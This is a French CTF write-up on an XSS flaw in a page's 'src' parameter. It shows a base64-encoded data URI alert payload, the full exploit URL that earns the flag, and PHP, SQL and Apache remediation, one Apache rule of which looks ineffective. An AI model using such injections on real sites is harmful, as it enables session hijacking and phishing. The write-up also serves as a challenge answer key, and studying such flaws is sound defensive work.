# Vulnérabilité d'Injection via Data URI

## 1. Description de la Faille
Cette vulnérabilité permet d'injecter du code arbitraire via un paramètre `src` en utilisant le protocole data URI, permettant l'exécution de scripts côté client.

## 2. Localisation
- URL vulnérable : `http://{IP}/index.php?page=media&src=nsa`
- Point d'entrée : Paramètre `src`
- Déclencheur : Logo NSA clickable

## 3. Exploitation

### Étape 1 : Comprendre la Structure
URL originale :
```
http://{IP}/index.php?page=media&src=nsa
```

### Étape 2 : Préparer le Payload
1. Script à injecter :
```javascript
<script>alert('toto')</script>
```

2. Encoder en Base64 :
```
PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
```

### Étape 3 : Construire le Data URI
Format :
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
```

### Étape 4 : URL Finale d'Exploitation
```
http://{IP}/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
```

## 4. Impact de la Faille
1. Exécution de code arbitraire :
   - XSS
   - Vol de cookies
   - Manipulation du DOM

2. Risques :
   - Détournement de session
   - Phishing
   - Compromission du navigateur

## 5. Comment Corriger

### Solution en PHP avec Base de Données
```php
class MediaManager {
    private $db;
    private $allowed_media = ['nsa', 'logo', 'header'];
    
    public function getMedia($identifier) {
        // Validation de l'identifiant
        if (!in_array($identifier, $this->allowed_media)) {
            throw new SecurityException('Media non autorisé');
        }
        
        // Récupération depuis la base de données
        $stmt = $this->db->prepare('SELECT path FROM media WHERE identifier = ?');
        $stmt->execute([$identifier]);
        
        return $stmt->fetchColumn();
    }
}
```

### Structure de la Base de Données
```sql
CREATE TABLE media (
    id INT PRIMARY KEY AUTO_INCREMENT,
    identifier VARCHAR(50) UNIQUE NOT NULL,
    path VARCHAR(255) NOT NULL,
    mime_type VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Données d'exemple
INSERT INTO media (identifier, path, mime_type) VALUES
('nsa', '/images/nsa.jpg', 'image/jpeg'),
('logo', '/images/logo.png', 'image/png');
```

## 6. Bonnes Pratiques

### Gestion des Ressources
1. Utiliser des identifiants uniques
2. Stocker les chemins en base de données
3. Valider les types MIME
4. Restriction des accès aux fichiers

### Implémentation Sécurisée
```php
class SecureMediaLoader {
    public function loadMedia($id) {
        // Whitelist de types MIME autorisés
        $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
        
        // Récupération du média
        $media = $this->getMediaFromDatabase($id);
        
        // Validation du type
        if (!in_array($media['mime_type'], $allowed_types)) {
            throw new SecurityException('Type de média non autorisé');
        }
        
        // Envoi sécurisé
        return $this->sendSecureMedia($media);
    }
}
```

## 7. Protection Additionnelle

### Configuration Serveur
```apache
# Apache - Protection supplémentaire
<Location /media>
    # Interdire les data URIs
    SetEnvIfNoCase Referer "^data:" bad_referer
    Order Allow,Deny
    Allow from all
    Deny from env=bad_referer
</Location>
```

### Validation des Ressources
```php
function validateResource($src) {
    // Liste blanche d'identifiants valides
    $valid_resources = ['nsa', 'logo', 'header'];
    
    // Vérification basique
    if (!in_array($src, $valid_resources)) {
        return false;
    }
    
    // Vérification supplémentaire du format
    if (strpos($src, 'data:') === 0) {
        return false;
    }
    
    return true;
}
```

## 8. Pour le CTF
Pour obtenir le flag, utiliser cette URL :
```
http://{IP}/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
```

## 9. Ressources
- OWASP XSS Prevention
- Data URI Security Considerations
- Content Security Policy Guide